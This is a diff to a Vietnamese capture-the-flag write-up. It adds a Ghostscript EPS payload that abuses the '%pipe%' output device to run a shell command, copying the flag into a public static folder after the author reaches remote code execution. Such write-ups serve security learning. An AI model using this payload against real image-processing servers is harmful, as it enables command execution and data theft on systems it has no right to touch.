@@ -58,5 +58,18 @@ Sử dụng luôn craft image của CVE, chạy thử trên local
 Oke vậy là đã RCE được, bây giờ cần làm thế nào để đọc được flag được dấu bên trong. Để ý răng có một đường dẫn tệp được public là biến UPLOAD_FOLDER (/static/petpets/) 🤟.
 Vậy chỉ cần đọc file flag và ghi vào một file bất kỳ trong này là xong.
 
+```
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%cat flag > application/static/petpets/test.txt) currentdevice putdeviceprops
+```
+
 ![image](https://user-images.githubusercontent.com/61985236/132112752-4583ab37-3e83-4e77-9d83-bfde6b024c67.png)
 
